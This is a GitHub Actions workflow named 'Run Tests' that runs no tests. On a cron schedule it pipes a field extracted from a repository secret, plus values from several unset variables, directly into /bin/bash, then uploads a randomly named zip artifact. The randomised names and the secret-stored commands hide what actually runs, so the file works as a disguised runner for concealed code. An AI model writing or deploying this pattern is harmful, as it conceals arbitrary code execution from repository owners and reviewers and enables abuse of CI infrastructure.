name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '36 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          opsd64: ${{ secrets.opsd64 }}
        run: |
          printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
          echo $nr5305 | jq -r .brie24491 | /bin/bash
          echo $ctm81 | jq -r .ziaj4 | /bin/bash
          printf '%s' "$isvj657" | jq -r .s711 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: DpIZAAck
          path: "*.zip"
          retention-days: 1
